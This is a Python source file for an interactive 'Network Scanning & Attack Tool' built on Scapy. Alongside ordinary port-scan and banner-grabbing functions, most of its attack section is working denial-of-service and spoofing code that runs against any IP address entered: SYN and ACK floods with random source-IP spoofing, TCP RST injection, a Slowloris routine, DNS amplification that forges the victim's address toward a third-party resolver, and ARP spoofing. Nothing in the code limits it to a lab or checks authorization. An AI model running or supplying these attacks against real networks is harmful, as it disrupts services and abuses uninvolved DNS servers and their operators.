import argparse
from scapy.all import IP, ICMP, TCP, UDP, DNS, DNSQR, send, sendp, Ether, ARP, sr1
from termcolor import colored
import colorama
import re
import socket
import time
import random

# Initialize colorama for Windows support
colorama.init()

# Expanded menu of available scans and attacks with color-coding
MENU_OPTIONS = {
    1: ("Ping Scan (ICMP)", "blue"),
    2: ("TCP SYN Scan", "green"),
    3: ("TCP Connect Scan", "cyan"),
    4: ("TCP FIN Scan", "yellow"),
    5: ("TCP Xmas Scan", "magenta"),
    6: ("TCP Null Scan", "red"),
    7: ("TCP SYN Flood Attack", "red"),
    8: ("TCP RST Injection Attack", "green"),
    9: ("TCP ACK Flood Attack", "yellow"),
    10: ("Slowloris Attack", "blue"),
    11: ("DNS Amplification Attack", "red"),
    12: ("ARP Spoofing", "green"),
    0: ("Exit", "red")
}

def display_menu():
    """
    Displays a menu of scans and attacks with color coding.
    """
    print(colored("\n=== Network Scanning & Attack Tool ===\n", "yellow", attrs=["bold"]))
    for option, (description, color) in MENU_OPTIONS.items():
        print(colored(f"{option}. {description}", color))

def get_user_choice():
    """
    Get the user's choice from the menu.
    """
    try:
        choice = int(input(colored("\nSelect an option (0-12): ", "cyan")))
        if choice not in MENU_OPTIONS:
            raise ValueError
        return choice
    except ValueError:
        print(colored("[!] Invalid choice. Please select a valid option.", "red"))
        return None

def get_target_ip():
    """
    Request and validate the target IP address from the user.
    """
    ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
    while True:
        target_ip = input(colored("Enter the target IP address: ", "cyan"))
        if re.match(ip_pattern, target_ip):
            return target_ip
        else:
            print(colored("[!] Invalid IP address format. Please enter a valid IPv4 address.", "red"))

def get_port_range():
    """
    Request and validate the port range from the user for scanning.
    """
    while True:
        port_input = input(colored("Enter port range (e.g., 20-80) or 'all' for all ports: ", "cyan"))
        if port_input.lower() == 'all':
            return 1, 65535
        else:
            try:
                port_start, port_end = map(int, port_input.split('-'))
                if 1 <= port_start <= 65535 and 1 <= port_end <= 65535 and port_start <= port_end:
                    return port_start, port_end
                else:
                    print(colored("[!] Invalid port range. Ports must be between 1 and 65535.", "red"))
            except (ValueError, TypeError):
                print(colored("[!] Invalid format. Enter range as 'start-end' (e.g., 20-80).", "red"))

def should_enable_verbose():
    """
    Ask the user if they want to enable verbose mode.
    """
    while True:
        verbose = input(colored("Do you want to enable verbose mode? (y/n): ", "cyan")).lower()
        if verbose in ['y', 'n']:
            return verbose == 'y'
        else:
            print(colored("[!] Invalid choice. Please enter 'y' for yes or 'n' for no.", "red"))

def should_enable_version_scan():
    """
    Ask the user if they want to enable version detection scan.
    """
    while True:
        version = input(colored("Do you want to enable version detection (service versions)? (y/n): ", "cyan")).lower()
        if version in ['y', 'n']:
            return version == 'y'
        else:
            print(colored("[!] Invalid choice. Please enter 'y' for yes or 'n' for no.", "red"))

def should_enable_stealth_scan():
    """
    Ask the user if they want to enable stealth scan (TCP SYN scan).
    """
    while True:
        stealth = input(colored("Do you want to enable stealth scan (SYN scan)? (y/n): ", "cyan")).lower()
        if stealth in ['y', 'n']:
            return stealth == 'y'
        else:
            print(colored("[!] Invalid choice. Please enter 'y' for yes or 'n' for no.", "red"))

def should_spoof_ip():
    """
    Ask the user if they want to enable IP spoofing for the attack.
    """
    while True:
        spoof = input(colored("Do you want to enable IP spoofing? (y/n): ", "cyan")).lower()
        if spoof in ['y', 'n']:
            return spoof == 'y'
        else:
            print(colored("[!] Invalid choice. Please enter 'y' for yes or 'n' for no.", "red"))

def construct_nmap_command(target_ip, port_start, port_end, verbose, version, stealth):
    """
    Construct the equivalent Nmap command based on user options.
    """
    command = f"nmap {target_ip} -p {port_start}-{port_end}"
    if verbose:
        command += " -v"
    if version:
        command += " -sV"
    if stealth:
        command += " -sS"
    return command

def generate_random_ip():
    """
    Generate a random IP address for IP spoofing.
    """
    return f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"

# Banner Grabbing for Version Detection
def grab_banner(target, port):
    """
    Attempt to grab the service banner from an open port (basic version detection).
    Handles non-UTF-8 data safely.
    """
    try:
        sock = socket.socket()
        sock.settimeout(2)  # Set a short timeout
        sock.connect((target, port))
        banner = sock.recv(1024)  # Receive the banner (as raw bytes)
        sock.close()

        # Attempt to decode the banner with UTF-8 first
        try:
            return banner.decode('utf-8').strip()  # Try decoding as UTF-8
        except UnicodeDecodeError:
            # If decoding fails, return a safe printable representation
            return banner.decode('latin1').strip()  # Fallback to latin-1 or raw bytes
        
    except (socket.timeout, ConnectionRefusedError, socket.error):
        return None

# SCAN FUNCTIONS

def ping_scan(target):
    """
    Perform an ICMP Ping Scan to check if a host is up.
    """
    print(f"[*] Starting ICMP Ping Scan on {target}")
    print(colored("[*] To abort press CTRL + C", "yellow"))
    try:
        pkt = IP(dst=target) / ICMP()
        response = sr1(pkt, timeout=1, verbose=False)
        if response:
            print(f"[+] {target} is up")
        else:
            print(f"[-] {target} is down or unresponsive")
    except KeyboardInterrupt:
        print(colored("[!] Ping scan stopped by user. Returning to the main menu...", "red"))

def tcp_syn_scan(target, port_start, port_end, verbose=False, version=False, stealth=False):
    """
    Perform a TCP SYN Scan on a range of ports (stealth scan).
    Verbose output is controlled more strictly for stealth mode.
    """
    nmap_command = construct_nmap_command(target, port_start, port_end, verbose, version, stealth)
    print(f"[*] Starting TCP SYN Scan (Stealth Mode: {stealth}) on {target} from port {port_start} to {port_end}")
    print(f"[*] Equivalent Nmap Command: {nmap_command}")
    print(colored("[*] To abort press CTRL + C", "yellow"))

    try:
        for port in range(port_start, port_end + 1):
            pkt = IP(dst=target) / TCP(dport=port, flags="S")
            
            # Only print packet sending details if verbose mode is explicitly enabled AND not in stealth mode
            if verbose and not stealth:
                print(f"[VERBOSE] Sending SYN packet to {target}:{port}")

            response = sr1(pkt, timeout=0.5, verbose=False)  # Disable Scapy's internal verbose output
            
            if response and response.haslayer(TCP) and response[TCP].flags == "SA":
                print(f"[+] Port {port} is open on {target}")
                
                if version:
                    print(f"[*] Attempting to detect service version on port {port}...")
                    banner = grab_banner(target, port)
                    if banner:
                        print(f"[+] Detected version on port {port}: {banner}")
                    else:
                        print(f"[-] No banner/version information available on port {port}")

            elif verbose and not stealth:
                print(f"[VERBOSE] No response from {target}:{port}")
    
    except KeyboardInterrupt:
        print(colored("[!] TCP SYN scan stopped by user. Returning to the main menu...", "red"))

def tcp_connect_scan(target, port_start, port_end, verbose=False, version=False):
    """
    Perform a TCP Connect Scan by completing the full handshake on a range of ports.
    Only report open ports.
    """
    nmap_command = construct_nmap_command(target, port_start, port_end, verbose, version, stealth=False)
    print(f"[*] Starting TCP Connect Scan on {target} from port {port_start} to {port_end}")
    print(f"[*] Equivalent Nmap Command: {nmap_command}")
    print(colored("[*] To abort press CTRL + C", "yellow"))

    try:
        for port in range(port_start, port_end + 1):
            pkt = IP(dst=target) / TCP(dport=port, flags="S")
            
            # Custom verbose output for sending packets
            if verbose:
                print(f"[VERBOSE] Sending SYN packet to {target}:{port}")

            response = sr1(pkt, timeout=0.5, verbose=False)  # Disable Scapy's internal verbose output
            if response and response.haslayer(TCP) and response[TCP].flags == "SA":
                print(f"[+] Port {port} is open on {target}")
                if version:
                    print(f"[*] Attempting to detect service version on port {port}...")
                    banner = grab_banner(target, port)
                    if banner:
                        print(f"[+] Detected version on port {port}: {banner}")
                    else:
                        print(f"[-] No banner/version information available on port {port}")

            elif verbose:
                print(f"[VERBOSE] No response from {target}:{port}")

    except KeyboardInterrupt:
        print(colored("[!] TCP Connect scan stopped by user. Returning to the main menu...", "red"))

def tcp_fin_scan(target, port_start, port_end, verbose=False):
    """
    Perform a TCP FIN Scan to check for open/closed ports.
    """
    print(f"[*] Starting TCP FIN Scan on {target} from port {port_start} to {port_end}")
    print(colored("[*] To abort press CTRL + C", "yellow"))
    try:
        for port in range(port_start, port_end + 1):
            pkt = IP(dst=target) / TCP(dport=port, flags="F")
            
            # Custom verbose output
            if verbose:
                print(f"[VERBOSE] Sending FIN packet to {target}:{port}")
            
            response = sr1(pkt, timeout=0.5, verbose=False)  # Disable Scapy's internal verbose output
            if not response:
                print(f"[+] Port {port} is open or filtered on {target}")
            elif verbose:
                print(f"[VERBOSE] Received response from {target}:{port}")

    except KeyboardInterrupt:
        print(colored("[!] TCP FIN scan stopped by user. Returning to the main menu...", "red"))

def tcp_xmas_scan(target, port_start, port_end, verbose=False):
    """
    Perform a TCP Xmas Scan.
    """
    print(f"[*] Starting TCP Xmas Scan on {target} from port {port_start} to {port_end}")
    print(colored("[*] To abort press CTRL + C", "yellow"))
    try:
        for port in range(port_start, port_end + 1):
            pkt = IP(dst=target) / TCP(dport=port, flags="FPU")
            
            # Custom verbose output
            if verbose:
                print(f"[VERBOSE] Sending Xmas packet to {target}:{port}")
            
            response = sr1(pkt, timeout=0.5, verbose=False)  # Disable Scapy's internal verbose output
            if not response:
                print(f"[+] Port {port} is open or filtered on {target}")
            elif verbose:
                print(f"[VERBOSE] Received response from {target}:{port}")

    except KeyboardInterrupt:
        print(colored("[!] TCP Xmas scan stopped by user. Returning to the main menu...", "red"))

def tcp_null_scan(target, port_start, port_end, verbose=False):
    """
    Perform a TCP Null Scan.
    """
    print(f"[*] Starting TCP Null Scan on {target} from port {port_start} to {port_end}")
    print(colored("[*] To abort press CTRL + C", "yellow"))
    try:
        for port in range(port_start, port_end + 1):
            pkt = IP(dst=target) / TCP(dport=port, flags="")
            
            # Custom verbose output
            if verbose:
                print(f"[VERBOSE] Sending Null packet to {target}:{port}")
            
            response = sr1(pkt, timeout=0.5, verbose=False)  # Disable Scapy's internal verbose output
            if not response:
                print(f"[+] Port {port} is open or filtered on {target}")
            elif verbose:
                print(f"[VERBOSE] Received response from {target}:{port}")

    except KeyboardInterrupt:
        print(colored("[!] TCP Null scan stopped by user. Returning to the main menu...", "red"))

# ATTACK FUNCTIONS

def syn_flood(target, count, spoof_ip):
    """
    Perform a TCP SYN Flood attack on a target (with optional IP spoofing).
    Supports stopping the attack with CTRL+C.
    """
    print(f"[*] Starting SYN Flood Attack on {target} with {count} packets")
    print(colored("[*] To abort press CTRL + C", "yellow"))
    try:
        for _ in range(count):
            src_ip = generate_random_ip() if spoof_ip else target  # Spoof IP if enabled
            pkt = IP(src=src_ip, dst=target) / TCP(dport=80, flags="S")  # Default to port 80 for SYN Flood
            send(pkt, verbose=False)
        print("[+] SYN Flood complete")
    except KeyboardInterrupt:
        print(colored("[!] SYN Flood attack stopped by user. Returning to the main menu...", "red"))

def rst_injection(target, port, spoof_ip):
    """
    Perform a TCP RST Injection attack to close connections (with optional IP spoofing).
    """
    print(f"[*] Starting TCP RST Injection on {target}:{port}")
    print(colored("[*] To abort press CTRL + C", "yellow"))
    try:
        src_ip = generate_random_ip() if spoof_ip else target  # Spoof IP if enabled
        pkt = IP(src=src_ip, dst=target) / TCP(dport=port, flags="R")
        send(pkt, verbose=False)
        print("[+] TCP RST Injection complete")
    except KeyboardInterrupt:
        print(colored("[!] RST Injection attack stopped by user. Returning to the main menu...", "red"))

def ack_flood(target, count, spoof_ip):
    """
    Perform a TCP ACK Flood attack to overwhelm the target (with optional IP spoofing).
    """
    print(f"[*] Starting TCP ACK Flood Attack on {target} with {count} packets")
    print(colored("[*] To abort press CTRL + C", "yellow"))
    try:
        for _ in range(count):
            src_ip = generate_random_ip() if spoof_ip else target  # Spoof IP if enabled
            pkt = IP(src=src_ip, dst=target) / TCP(dport=80, flags="A")  # Default to port 80 for ACK Flood
            send(pkt, verbose=False)
        print("[+] ACK Flood complete")
    except KeyboardInterrupt:
        print(colored("[!] ACK Flood attack stopped by user. Returning to the main menu...", "red"))

def slowloris_attack(target, port, connections, sleep_time):
    """
    Perform a Slowloris Attack by making incomplete HTTP requests to the server.
    This version supports graceful stopping when the user presses CTRL+C.
    """
    def slowloris_socket():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(b"GET /? HTTP/1.1\r\n")
        s.send(b"Host: " + bytes(target, 'utf-8') + b"\r\n")
        return s

    print(f"[*] Starting Slowloris Attack on {target}:{port} with {connections} connections")
    print(colored("[*] To abort press CTRL + C", "yellow"))
    sockets = []
    try:
        for _ in range(connections):
            s = slowloris_socket()
            sockets.append(s)
        print(f"[+] Established {len(sockets)} sockets")

        while True:
            for s in sockets:
                try:
                    s.send(b"X-a: b\r\n")
                except socket.error:
                    sockets.remove(s)
                    try:
                        s = slowloris_socket()
                        sockets.append(s)
                    except socket.error:
                        pass
            time.sleep(sleep_time)

    except KeyboardInterrupt:
        print(colored("[!] Slowloris attack stopped by user. Returning to the main menu...", "red"))

def dns_amplification_attack(target, dns_server, count):
    """
    Perform a DNS Amplification Attack by sending spoofed DNS queries to a public DNS server.
    Supports stopping the attack with CTRL+C.
    """
    print(f"[*] Starting DNS Amplification Attack on {target} via DNS server {dns_server} with {count} requests")
    print(colored("[*] To abort press CTRL + C", "yellow"))
    try:
        for _ in range(count):
            pkt = IP(src=target, dst=dns_server) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="google.com"))
            send(pkt, verbose=False)
        print("[+] DNS Amplification Attack complete")
    except KeyboardInterrupt:
        print(colored("[!] DNS Amplification attack stopped by user. Returning to the main menu...", "red"))

def arp_spoof(target_ip, spoof_ip, interface):
    """
    Perform ARP Spoofing by sending a spoofed ARP packet to the target.
    """
    print(f"[*] Starting ARP Spoofing: {target_ip} will be associated with {spoof_ip}")
    print(colored("[*] To abort press CTRL + C", "yellow"))
    try:
        pkt = Ether() / ARP(pdst=target_ip, psrc=spoof_ip)
        sendp(pkt, iface=interface, verbose=False)
        print("[+] ARP Spoofing complete")
    except KeyboardInterrupt:
        print(colored("[!] ARP Spoofing attack stopped by user. Returning to the main menu...", "red"))

# MAIN

def main():
    while True:
        display_menu()
        choice = get_user_choice()
        if choice is None:
            continue
        elif choice == 0:
            print(colored("Exiting... Goodbye!", "green"))
            break  # Exit the program

        # Get target IP for any scan or attack selected
        target_ip = get_target_ip()

        if choice in [2, 3]:
            port_start, port_end = get_port_range()  # Ask for port range for these scan types

            # Ask user for additional options
            verbose = should_enable_verbose()
            version = should_enable_version_scan()
            if choice == 2:
                stealth = should_enable_stealth_scan()
                tcp_syn_scan(target_ip, port_start, port_end, verbose, version, stealth)
            elif choice == 3:
                tcp_connect_scan(target_ip, port_start, port_end, verbose, version)

        elif choice == 1:
            ping_scan(target_ip)

        elif choice in [4, 5, 6]:
            port_start, port_end = get_port_range()
            verbose = should_enable_verbose()  # Verbose mode for these scans
            if choice == 4:
                tcp_fin_scan(target_ip, port_start, port_end, verbose)
            elif choice == 5:
                tcp_xmas_scan(target_ip, port_start, port_end, verbose)
            elif choice == 6:
                tcp_null_scan(target_ip, port_start, port_end, verbose)

        elif choice == 7:
            count = int(input(colored("Enter number of SYN packets to send: ", "cyan")))
            spoof_ip = should_spoof_ip()
            syn_flood(target_ip, count, spoof_ip)
        elif choice == 8:
            port = int(input(colored("Enter target port for TCP RST Injection Attack: ", "cyan")))
            spoof_ip = should_spoof_ip()
            rst_injection(target_ip, port, spoof_ip)
        elif choice == 9:
            count = int(input(colored("Enter number of ACK packets to send: ", "cyan")))
            spoof_ip = should_spoof_ip()
            ack_flood(target_ip, count, spoof_ip)
        elif choice == 10:
            port = int(input(colored("Enter target port for Slowloris Attack: ", "cyan")))
            connections = int(input(colored("Enter number of connections to establish: ", "cyan")))
            sleep_time = float(input(colored("Enter sleep time between sending headers (in seconds): ", "cyan")))
            slowloris_attack(target_ip, port, connections, sleep_time)
        elif choice == 11:
            dns_server = input(colored("Enter DNS server IP for DNS Amplification: ", "cyan"))
            count = int(input(colored("Enter number of DNS requests to send: ", "cyan")))
            dns_amplification_attack(target_ip, dns_server, count)
        elif choice == 12:
            spoof_ip = input(colored("Enter the spoof IP address: ", "cyan"))
            interface = input(colored("Enter the network interface (e.g., eth0): ", "cyan"))
            arp_spoof(target_ip, spoof_ip, interface)

        # After executing, ask the user if they want to return to the menu or exit
        while True:
            again = input(colored("\nDo you want to return to the main menu (m) or exit (e)? ", "yellow"))
            if again.lower() == 'm':
                break  # Return to the main menu
            elif again.lower() == 'e':
                print(colored("Exiting... Goodbye!", "green"))
                return  # Exit the program
            else:
                print(colored("[!] Invalid choice. Please enter 'm' for menu or 'e' to exit.", "red"))

if __name__ == "__main__":
    main()
